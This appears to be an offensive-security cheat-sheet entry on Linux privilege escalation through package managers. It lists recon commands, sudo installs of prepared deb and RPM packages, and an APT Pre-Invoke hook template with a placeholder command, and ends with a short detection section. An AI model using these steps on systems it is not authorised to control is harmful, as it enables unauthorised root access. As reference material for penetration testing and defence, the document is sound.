---
technique: Package Manager Abuse
category: privilege-escalation
targets: Linux Package Managers
protocols: Local
remote_capable: false
tags: linux privilege-escalation apt dpkg rpm package-manager sudo
---

# Package Manager Abuse

Package manager abuse targets sudo-allowed package commands, install hooks, and local package installation paths that execute maintainer scripts as root.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Sudo rule or root context | Package managers usually require elevated privileges |
| Prepared package or hook | Package payload construction belongs in a tool note |
| Compatible manager | Commands depend on Debian, RPM, or Snap packaging |

## Linux

### Debian packages

#sh #dpkg #recon

List installed Debian packages.

```sh title:"List Debian packages"
dpkg -l
```
<!-- cheat -->

### RPM packages

#sh #rpm #recon

List installed RPM packages.

```sh title:"List RPM packages"
rpm -qa
```
<!-- cheat -->

### Sudo package rights

#sh #sudo #recon

List sudo rules that may allow package manager abuse.

```sh title:"List sudo package rights"
sudo -l
```
<!-- cheat -->

### Install local deb

#sh #dpkg #package-manager

Install a prepared local Debian package.

```sh title:"Install local Debian package"
sudo dpkg -i "$package_file"
```
<!-- cheat
var package_file
-->

### Install local RPM

#sh #rpm #package-manager

Install a prepared local RPM package.

```sh title:"Install local RPM package"
sudo rpm -i "$package_file"
```
<!-- cheat
var package_file
-->

### APT pre-invoke hook

#sh #apt #package-manager

Run an APT command with a prepared pre-invoke hook when sudo policy allows option control.

```sh title:"Run APT with pre-invoke hook"
sudo apt-get update -o "APT::Update::Pre-Invoke::$hook_name=$hook_command"
```
<!-- cheat
var hook_name
var hook_command
-->

## Detection

Monitor local package installs, package manager option overrides, maintainer script execution, and sudo rules that allow package commands with attacker-controlled arguments.
